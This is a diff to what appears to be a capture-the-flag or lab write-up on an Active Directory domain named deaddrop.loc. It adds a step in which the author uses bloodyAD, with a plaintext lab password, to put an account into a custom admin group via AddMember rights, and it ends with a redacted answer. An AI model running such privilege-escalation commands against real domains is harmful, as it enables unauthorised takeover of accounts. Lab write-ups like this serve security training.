@@ -225,6 +225,12 @@ bloodyAD --host 192.168.11.100 -d deaddrop.loc -u [REDACTED] -p 'DropsOfJupiter2
 
 The output included a custom admin-style group under `CN=Users,DC=deaddrop,DC=loc`.
 
+After identifying the `AddMember` permission, I added the domain account to the custom admin group:
+
+```bash
+bloodyAD --host 192.168.11.100 -d deaddrop.loc -u [REDACTED] -p 'DropsOfJupiter2026!' add groupMember '[REDACTED_GROUP]' '[REDACTED_USER]'
+```
+
 ```text
 Answer: [REDACTED]
 ```
